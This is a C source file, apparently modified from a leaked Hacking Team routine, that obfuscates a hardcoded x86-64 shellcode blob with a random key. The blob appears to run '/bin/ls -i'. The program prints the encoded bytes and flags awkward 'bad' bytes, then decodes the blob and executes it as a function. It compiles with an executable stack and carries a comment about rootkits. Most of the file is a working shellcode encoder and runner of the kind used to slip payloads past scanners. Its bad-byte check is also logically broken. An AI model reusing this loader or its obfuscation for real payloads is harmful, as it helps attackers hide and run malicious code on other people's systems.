
/*
https://wikileaks.org/hackingteam/emails/emailid/229541

* Simple string obfuscation - Quequero 2013
*
* Obfuscated string format:
* 1-byte key. 1-byte module. 1-byte length, <string>


modified for my personal needs

cc n.c -z execstack

TODO: mprotect, memset



*/



#include <string.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

#include <sys/mman.h>

/* <search string> <replace string> <string tosearch> */
unsigned char *str_replace(unsigned char *search , unsigned
        char *replace , unsigned char *subject) {
    unsigned char *p = NULL , *old = NULL , *new_subject =
        NULL ;
    int c = 0 , search_size;



    search_size = strlen(search);



    for (p = strstr(subject , search) ; p != NULL ; p =
        strstr(p + search_size , search)) {
        c++;
    }



    c = (strlen(replace) - search_size )*c + strlen(subject);
    new_subject = malloc(c);
    if  (!new_subject) { 
           exit (1); 
    }
    strcpy(new_subject , "");
    old = subject;



    for (p = strstr(subject , search) ; p != NULL ; p =
        strstr(p + search_size , search)) {
        strncpy(new_subject + strlen(new_subject) , old , p -
        old);
        strcpy(new_subject + strlen(new_subject) , replace);
        old = p + search_size;
    }



    strcpy(new_subject + strlen(new_subject) , old);
    return new_subject;
}



int obfuscate(unsigned char *s, unsigned char *d) {
    unsigned int seed;
    unsigned char key, mod;
    unsigned char *rep = NULL;
    unsigned char nl[] = "\n";
    unsigned char tb[] = "\t";
    unsigned char cr[] = "\r";
    unsigned char cv[] = "\v";
    int i, j, len;



    srandom(time(0));
    seed = random();
    printf("seed: %d\n",seed);


    key = (unsigned char)(seed & 0x000000ff);
    mod = (unsigned char)((seed & 0x0000ff00) >>
        8);



    rep = str_replace("\\n", nl, s);
    rep = str_replace("\\t", tb, rep);
    rep = str_replace("\\r", cr, rep);
    rep = str_replace("\\v", cv, rep);



    len = strlen(rep);



    if (len > 255) {
        printf("String too long\n");
        return;
    }



    d[0] = key;
    d[1] = mod;
    d[2] = (unsigned char)len - key - mod;



    for (i = 0, j = 3; i < len; i++, j++) {
        d[j] = rep[i] - key;
        d[j] -= mod;
        d[j] -= mod;
    }



    return len;
}



unsigned char* deobfuscate(unsigned char *s) {
    unsigned char key, mod, len;
    int i, j;
    static unsigned char d[256]; // E' zozza ma cosi' non
        // serve la free()



    key = s[0];
    mod = s[1];
    len = s[2] + key + mod;



    /* zero terminate the string */
    memset(d, 0x00, len + 1);



    for (i = 0, j = 3; i < len; i++, j++) {
        d[i] = s[j] + mod;
        d[i] += mod;
        d[i] += key;
    }



    d[len] = 0;
    return d;
}



int main(int ac, char *av[]) {

    unsigned char *buf, *test;
    int i, obf_len;
    
unsigned char sc[] = "\x48\x31\xc0\x48\x31\xd2\x50\x50\xc7\
\x04\x24\x2f\x2f\x62\x69\xc7\x44\x24\x04\x6e\x2f\
\x6c\x73\x48\x89\xe7\x50\x50\x66\xc7\x04\x24\x2d\
\x69\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x83\
\xc0\x3b\x0f\x05";


    obf_len = 52;  /* hardcoded for you */
    /* obf_len = strlen(sc + 3); */




    buf = (unsigned char *)malloc(obf_len);
    if (!buf) {
           exit (1); 
    }
    memset(buf, 0x00, obf_len);



    obf_len = obfuscate(sc, buf);
    obf_len += 3;


    printf("unsigned char obf_string[] = \"");



    for (i = 0; i < obf_len; i++) {
    if
  ( buf[i] == ('\x00' || '\x09'|| '\x0a'|| 
    '\x0b' || '\x0d'|| '\x22'||
    '\x27' || '\xff'|| '\xcc'))
    printf("\n<<<< byte \\x%02x not comfortable >>>>", buf[i]);
    
        printf("\\x");
        printf("%02x", buf[i]);
    }


    if (!av[1]) {
    printf("\"; // \"%s\"\n", sc );
    }
    test = deobfuscate(buf);


    if (!av[1]) {
    /* printf("Deobfuscated string:(raw) \"%s\"\n", test); */
    printf("Deobfuscated string: \n" );
    for (i = 0; i < obf_len; i++) {
        if (test[i] == '\x00') 
           goto morn; /* Don't care after syscall on rootkits */
        printf("\\x");
        printf("%02x", test[i]);
    }
    morn: printf("\n" );
    }
    int (*fun)();
    fun = (int(*)())test;
    /* mprotect(test,strlen(test),PROT_EXEC | PROT_READ | PROT_WRITE); */
    printf("%d\n", strlen(test));
    (int)(*fun)();
    free(buf);
    return 0;
}
